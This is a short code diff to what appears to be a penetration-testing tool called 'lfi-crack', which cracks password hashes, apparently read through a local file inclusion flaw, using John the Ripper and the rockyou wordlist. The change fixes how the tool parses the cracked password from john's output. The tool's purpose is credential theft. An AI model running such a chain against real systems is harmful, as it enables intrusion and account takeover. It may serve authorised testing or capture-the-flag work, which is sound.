@@ -85,7 +85,9 @@ def run(url: str, param: str, target: str) -> str:
         show = subprocess.run(["john", "--show", hp], capture_output=True, text=True, timeout=60)
     except Exception as e:  # noqa: BLE001
         return f"[lfi-crack: john failed: {e}] (hash for {user} at {hp})"
-    m = re.search(rf"^{re.escape(user)}:([^:]+):", show.stdout or "", re.M)
+    # john --show prints `user:password` (no trailing colon for a user:hash file) or
+    # `user:password:other:fields` for a full shadow line — capture the password either way.
+    m = re.search(rf"(?m)^{re.escape(user)}:([^:\n]+)", show.stdout or "")
     if not m:
         return f"[lfi-crack: hash for {user} not cracked by rockyou] ({hp})"
     pw = m.group(1)
